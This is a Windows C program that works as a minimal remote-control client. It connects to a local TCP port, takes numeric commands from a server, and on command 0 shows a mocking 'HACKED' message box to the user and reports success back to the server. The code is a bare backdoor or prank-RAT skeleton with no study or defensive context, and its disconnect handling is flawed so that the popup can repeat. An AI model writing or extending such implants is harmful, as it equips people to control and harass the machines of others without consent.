#include <stdio.h>
#include <winsock2.h>
#include <windows.h>

#pragma comment(lib, "ws2_32.lib")

#define SERVER "127.0.0.1"
#define PORT 65432

int main() {
    struct sockaddr_in server;
    WSADATA wsa;
    SOCKET sock;

    ///////////////////////////////////////////////

    if (WSAStartup(MAKEWORD(2, 2), &wsa) != 0) {
        return 0;
    }

    sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock == INVALID_SOCKET) {
        WSACleanup();
        return 0;
    }

    server.sin_family = AF_INET;
    server.sin_addr.s_addr = inet_addr(SERVER);
    server.sin_port = htons(PORT);

    if (connect(sock, (struct sockaddr *)&server, sizeof(server)) == SOCKET_ERROR) {
        closesocket(sock);
        WSACleanup();
        return 0;
    }

    ///////////////////////////////////////////////

    while (1) {
        char buffer[16];
        int rs = recv(sock, buffer, sizeof(buffer) - 1, 0);

        if (rs == SOCKET_ERROR) {
            break;
        }

        buffer[rs] = '\0';
        int command = atoi(buffer); 

        ///////////////////////////////////////////////

        if (command == 99) {
            closesocket(sock);
            WSACleanup();
            return 0;
        }

        if (command == 0) {
            MessageBox(NULL, "HACKED LOL IDIOT", "You are an idiot", MB_OK);

            char *resp = "\n[+] Command Executed Successfully.\n";
            send(sock, resp, strlen(resp), 0);
        }

        ///////////////////////////////////////////////
    }

    closesocket(sock);
    WSACleanup();
    return 0;
}